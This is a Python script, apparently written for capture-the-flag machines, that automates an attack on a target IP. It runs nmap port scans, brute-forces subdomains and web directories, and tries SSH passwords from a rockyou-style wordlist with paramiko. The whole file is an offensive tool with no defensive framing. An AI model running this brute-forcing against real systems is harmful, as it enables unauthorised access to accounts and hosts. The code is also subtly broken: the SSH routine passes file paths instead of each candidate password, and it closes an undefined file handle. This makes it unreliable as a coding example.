#!/usr/bin/python3
import os
import sys
import argparse
import paramiko
from pythonping import ping
import subprocess
import re
import requests
import colorama
from colorama import Fore, Back, Style


# Construct an argument parser
all_args = argparse.ArgumentParser()

# Add arguments to the parser
all_args.add_argument("-ip", "--ip", required=True,
   help="box IP address")
all_args.add_argument("-n", "--hostname", required=True,
   help="box hostname")
all_args.add_argument("-s", "--subdomain", required=False,
   help="path to subdomain bruteforce wordlist")
all_args.add_argument("-u", "--username", required=False,
   help="path to ssh bruteforce login wordlist")
all_args.add_argument("-d", "--directory", required=False,
   help="path to directory bruteforce wordlist")
all_args.add_argument("-r", "--rockyou", required=False,
   help="path to rockyou file (or any other used for password bruteforcing)")
args = vars(all_args.parse_args())


targetip = (args['ip'])
hostname = (args['hostname'])
sub_wordlist = (args['subdomain'])
dir_wordlist = (args['directory'])
ssh_wordlist = (args['username'])
rockyou = (args['rockyou'])

colorama.init()
print(Fore.GREEN)
print('\n')

print("Creating /etc/hosts entry for target...")
hostscommand = 'sudo echo %s %s >> /etc/hosts'%(targetip,hostname)
os.system(hostscommand)
print("@@Checking host availability ...")
print(Style.RESET_ALL)
pingcommand = 'ping %s -c 1'%(targetip)
os.system(pingcommand)


print(Fore.GREEN)
print("@@Discovering open ports ...")
print(Style.RESET_ALL)
nmapinitial = """nmap -p- --open -v -n %s -oG %s.ini | grep open | awk '{print $1}' | grep [[:digit:]]""" %(targetip,hostname)
open_ports = os.popen(nmapinitial).read()
print(open_ports)

temp = re.findall(r'\d+', open_ports)
temp1 = list(map(int, temp))
ports = str(temp1).strip("[]").replace(" ","")


with open('nmap.comp', 'w') as f:
 	print(Fore.GREEN)
 	print("@@Initializing standard scan ...")
 	print(Style.RESET_ALL)
 	nmapcomp = """nmap -p%s -sC -sV -vv -oN nmap.std %s""" %(ports,targetip)
 	# print(nmapcomp)
 	output_nmapcomp = os.popen(nmapcomp).read()
 	print(output_nmapcomp)
 	f.write('{}\n'.format(output_nmapcomp))

if "80" in open_ports:
	print(Fore.GREEN)
	print("@@Port 80 found to be open, testing for subdomains, directories...")
	print(Style.RESET_ALL)
	sub_list = open(sub_wordlist).read() 
	subdoms = sub_list.splitlines()

	for sub in subdoms:
	    sub_domains = f"http://{sub}.%s"%(hostname) 

	    try:
	        requests.get(sub_domains)
	    
	    except requests.ConnectionError: 
	        pass
	    
	    else:
	        print("Valid domain: ",sub_domains)   


	sub_list = open(dir_wordlist).read() 
	directories = sub_list.splitlines()
	extensions = ["txt", "jpg", "pub", "py", "sh", "exe", "vba", "rb", "php"]
	for dir in directories:
			for x in extensions:
					dir_enum = f"http://%s/{dir}.{x}"%(targetip) 
					r = requests.get(dir_enum)
					if r.status_code==404: 
					    pass
					else:
					    print("Valid directory:" ,dir_enum)


if "22" in open_ports:
	print(Fore.GREEN)
	print("@@Discovered SSH client, attempting to bruteforce ...")
	print(Style.RESET_ALL)
	def ssh_connect(password, code=0):
	    ssh = paramiko.SSHClient()
	    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	    try:
	        ssh.connect(targetip, port=22, username=ssh_wordlist, password=rockyou)
	    except paramiko.AuthenticationException:
	        code = 1
	    ssh.close()
	    return code

	with open(rockyou, 'r') as file:
	    for line in file.readlines():
	        password = line.strip()
	        
	        try:
	            response = ssh_connect(password)

	            if response == 0:
	                 print('[*] Password found: '+ password)
	                 exit(0)
	            elif response == 1: 
	                print('[-] Password failed: '+ password)
	        except Exception as e:
	            print(e)
	        pass

	input_file.close()	
